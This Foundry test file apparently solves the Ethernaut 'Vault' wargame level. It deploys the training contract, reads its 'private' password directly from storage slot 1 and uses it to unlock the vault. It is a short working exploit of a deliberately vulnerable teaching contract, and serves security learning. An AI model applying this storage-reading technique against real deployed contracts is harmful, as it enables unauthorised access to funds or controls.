pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";

// contracts
import "../src/Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract VaultTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    Vault ethernautVault;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "VaultTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        ethernautVault = Vault(payable(levelAddress));

        vm.label(address(ethernautVault), "EthernautVault");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {
        bytes32 pwd = vm.load(address(ethernautVault), bytes32(uint256(1)));

        ethernautVault.unlock(pwd);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautVault)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }

}